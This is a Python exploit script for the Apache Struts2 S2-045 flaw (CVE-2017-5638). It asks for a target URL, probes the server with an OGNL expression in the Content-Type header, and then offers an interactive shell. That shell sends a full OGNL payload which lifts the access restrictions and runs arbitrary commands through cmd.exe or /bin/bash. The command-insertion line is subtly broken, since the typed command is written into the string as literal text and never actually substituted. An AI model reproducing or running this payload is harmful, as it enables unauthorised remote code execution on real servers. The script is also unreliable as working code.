import requests
import re
import urllib


def s2_045(url):
    relsult = {
        'name': 'S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）',
        'vulnerable': False
    }
    try:
        headers_payload = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': r'''"%{# context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('abcd',4321*1234)}.multipart/form-data"'''
        }
        req = requests.post(url, headers=headers_payload, timeout=3)
        if req.headers['abcd'] == '5332114':
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = url
            relsult['position'] = 'Content-Type'
            relsult['payload'] = headers_payload
        return relsult
    except:
        return relsult

def exp(url):
    if s2_045(url)['vulnerable']:
        while True:
            cmd_shell = input('[+] 执行命令:')
            payload = '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'" + cmd_shell + "\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'
            headers_payload = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
                'Content-Type': payload,
            }
            print(headers_payload)
            req = requests.post(url, headers=headers_payload, timeout=3, verify=False)
            print(req.text)


if __name__ == '__main__':
    url = input('输入目标URL:')
    exp(url)